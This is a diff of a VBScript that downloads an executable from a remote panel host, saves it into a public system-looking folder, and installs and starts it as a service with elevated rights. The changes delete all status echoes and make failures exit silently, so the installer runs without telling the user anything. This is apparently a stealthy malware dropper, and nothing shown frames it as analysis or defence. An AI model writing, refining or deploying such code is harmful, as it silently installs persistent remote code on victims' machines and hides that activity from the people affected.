@@ -6,7 +6,7 @@ End If
 
 ' Now running as admin, proceed with the script
 Dim url, downloadPath, objXMLHTTP, objStream, objShell, objFSO, objFile, installResult, startResult
-Dim commandOutput, errorFile
+Dim errorFile
 
 url = "http://panel.ryugi.be:5552/uploads/goService.exe"
 downloadPath = "C:\Users\Public\Sys\goService.exe"
@@ -31,9 +31,7 @@ If objXMLHTTP.Status = 200 Then
     objStream.Write objXMLHTTP.ResponseBody
     objStream.SaveToFile downloadPath, 2 ' Save as a file and overwrite if exists
     objStream.Close
-    WScript.Echo "File downloaded successfully to " & downloadPath
 Else
-    WScript.Echo "Failed to download file. HTTP Status: " & objXMLHTTP.Status
     WScript.Quit
 End If
 
@@ -42,14 +40,10 @@ If objFSO.FileExists(downloadPath) Then
     Set objShell = CreateObject("Shell.Application")
     
     ' Install the service
-    WScript.Echo "Installing service..."
     installResult = objShell.ShellExecute(downloadPath, "install", "", "runas", 1)
-    WScript.Echo "Service installation result: " & installResult
 
     ' Start the service
-    WScript.Echo "Starting service..."
     startResult = objShell.ShellExecute(downloadPath, "start", "", "runas", 1)
-    WScript.Echo "Service start result: " & startResult
 Else
-    WScript.Echo "Service file not found: " & downloadPath
+    WScript.Quit
 End If
